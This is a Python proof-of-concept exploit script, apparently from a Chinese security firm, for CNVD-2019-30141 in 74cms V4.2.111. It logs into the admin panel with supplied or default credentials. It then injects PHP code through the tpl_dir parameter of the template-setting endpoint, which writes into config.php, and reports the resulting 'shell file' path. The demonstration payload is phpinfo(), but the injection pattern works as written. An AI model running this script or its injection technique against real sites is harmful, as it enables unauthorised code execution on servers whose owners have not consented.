#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-30141
# Written by: 秋水
# Company: 泽鹿安全
#
# from pyfiglet import Figlet
import time
import requests
import datetime
import optparse

code = 'CNVD-2019-30141'
version = '1.0'
author = '秋水'
vulDate = '2020-04-09'
createDate = '2020-04-09'
updateDate = '2020-04-09'
name = '74cms后台存在代码执行漏洞(CNVD-2019-30141)'
appPowerLink = 'http://www.74cms.com'
appName = '74cms'
appVersion = '''74cms V4.2.111'''
way = '''python CNVD-2019-30141.py -u http://127.0.0.1  -n admin -p 123456'''


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    # f = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    # code1 = f.renderText(code)
    print(" ")
    # print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


def check():
    session = requests.session()
    address = url + "/index.php?m=admin&c=index&a=login"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "username": "%s" % user,
        "password": "%s" % pwd
    }
    print("[*] %s 正在尝试登录..." % nowtime())
    try:
        rsp = session.post(address, headers=headers, data=data)
        if rsp.status_code == 200:
            address1 = url + "/index.php?m=admin&c=index&a=index"
            rsp1 = session.get(address1)
            text = rsp1.text
            if rsp1.status_code == 200 and "网站后台管理中心" in str(text):
                time.sleep(0.3)
                print("[+] 登录成功！")
                address2 = url + "/index.php?m=admin&c=tpl&a=set&tpl_dir=','a',phpinfo(),'"
                rsp2 = session.get(address2)
                text1 = rsp2.text
                time.sleep(0.3)
                print("[*] %s 正在生成shell文件...")
                if rsp2.status_code == 200 and "设置成功" in str(text1):
                    time.sleep(0.3)
                    print("[+] shell文件地址为：%s/Application/Home/Conf/config.php" % url)
                    endtime()
                else:
                    time.sleep(0.3)
                    print("[-] shell文件生成失败")
                    endtime()
            else:
                time.sleep(0.3)
                print("[-] 登录失败！")
                endtime()
        else:
            time.sleep(0.3)
            print("[-] 登录失败！")
            endtime()

    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


if __name__ == "__main__":
    usage = "python %prog -u/-U <target url> -n/-N <username> -p/-P <password>"  # 用于显示帮助信息
    parser = optparse.OptionParser(usage)  # 创建对象实例
    parser.add_option('-u', '-U', dest='url', type='string', help='target url',
                      default="http://10.10.10.140")  # 需要的命令行参数
    parser.add_option('-n', '-N', dest='user', type='string', help='username', default="admin")
    parser.add_option('-p', '-P', dest='pwd', type='string', help='password', default="123456")
    (options, args) = parser.parse_args()
    url = options.url
    user = options.user
    pwd = options.pwd
    output()
    check()
